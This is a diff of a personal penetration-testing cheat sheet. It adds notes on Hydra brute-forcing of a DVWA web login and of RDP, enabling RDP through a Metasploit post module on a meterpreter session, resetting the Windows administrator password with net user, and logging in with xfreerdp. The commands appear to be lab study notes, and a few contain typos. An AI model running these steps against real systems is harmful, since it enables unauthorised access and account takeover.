@@ -11,7 +11,7 @@
 - [Gobuster](#gobuster)
 - [FFUF](#ffuf)
 - [Nikto](#nikto)
-- [Privilege escalation](/Privilege.md)
+
 - [Mysql](#mysql)
 - [Hydra](#hydra) - Brute force attack on ssh
 - [FTP](#ftp)
@@ -21,6 +21,7 @@
 - [Password Cracking](#cracking)
 - [Simple Local Web Servers](#localweb)
 - [RDP-3389](#rdp)
+- [Privilege escalation](/Privilege.md)
 
 - ## Cewl <a name="cewl"></a>
 - ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
@@ -148,15 +149,30 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 ### Brute Forcing a Website Login
 - Login page 
 - http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
-```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
-```
+
+- `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`
 
 
 - ## RDP-3389 <a name="rdp"></a>
+
+- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
+
+- `xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>`
+
+- __`search enable_rdp`__
 ```
-xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>
+use post/windows/manage/enable_rdp
+set sesstion 1
+exploit
 ```
+- __now you can change the password for the user in my case i have access to the administrator account__
+- __so i have meterpreter session running in the background__
+- __so use `shell`__
+- __change the password__
+- __`net user administrator password123`__
+- > you have change the password of the admininstrator so that we can login using `xfreerdp` into rdp using this login
+- __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__
+
 
 - ## Password Cracking <a name="cracking"></a>
 ### John The Ripper
